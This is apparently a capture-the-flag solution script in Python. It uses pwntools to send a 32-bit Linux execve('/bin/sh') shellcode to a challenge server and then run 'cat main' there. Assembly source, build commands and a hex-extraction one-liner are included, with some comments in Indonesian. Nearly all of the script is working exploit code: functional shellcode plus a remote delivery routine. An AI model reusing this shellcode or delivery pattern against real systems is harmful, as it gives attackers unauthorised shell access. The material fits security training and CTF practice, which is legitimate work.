import pwn

'''
; SHELLCODE arsitektur 32 bit

; compile:
; nasm -gstabs -f elf32 -o bin_sh.o bin_sh.asm && ld bin_sh.o -m elf_i386 -s -o bin_sh && ./bin_sh

; generate hex:
; objdump -M Intel -d ./bin_sh |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

section .text
    global _start
_start:
    xor eax, eax ; make eax = 0
    push eax ; push 0 to stack
    push "//sh" ; tanda garing di belakang berfungsi agar tidak ada null byte saat membuat payload
    push "/bin" ; push /bin/sh to stack
    mov ebx, esp ; mov /bin/sh to ebx
    mov ecx, eax ; make ecx 0
    mov edx, eax ; make edx 0
    mov al, 0xb ; execve
    int 0x80 ; syscall

    push ecx ; push 0 on the stack
    mov al, 1 ; exit
    int 0x80
'''

SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x51\xb0\x01\xcd\x80"
SERVER = ("01.linux.challenges.ctf.thefewchosen.com", 59219)

def send_cmd(cmd):
    with pwn.remote(SERVER[0], SERVER[1]) as r:
        r.recvuntil(b"let's start\n")
        r.sendline(SHELLCODE)
        r.sendline(cmd)
        print(r.recvall())

send_cmd("cat main")
